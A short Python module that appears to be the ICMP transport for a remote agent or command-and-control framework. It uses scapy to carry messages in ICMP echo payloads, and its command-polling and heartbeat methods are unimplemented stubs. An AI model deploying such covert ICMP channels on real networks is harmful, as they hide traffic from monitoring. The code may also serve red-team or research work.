from scapy.all import sr1, IP, ICMP
from ..logger import logger
from base import BaseComm

class ICMPComm(BaseComm):
    def __init__(self, target_ip: str, agent_id: str, auth_token: str):
        self.target_ip = target_ip
        self.agent_id = agent_id
        self.auth_token = auth_token

    def poll_commands(self):
        logger.info("ICMP poll_commands not implemented")
        return []

    def send_message(self, message: str) -> str:
        try:
            pkt = IP(dst=self.target_ip) / ICMP() / message.encode()
            reply = sr1(pkt, timeout=2, verbose=0)
            if reply and reply.haslayer(ICMP):
                payload = reply.getlayer(ICMP).payload.load
                return payload.decode(errors="ignore")
        except Exception as e:
            logger.error("ICMP send_message error: %s", e)
        return ""

    def heartbeat(self):
        logger.info("ICMP heartbeat not implemented")
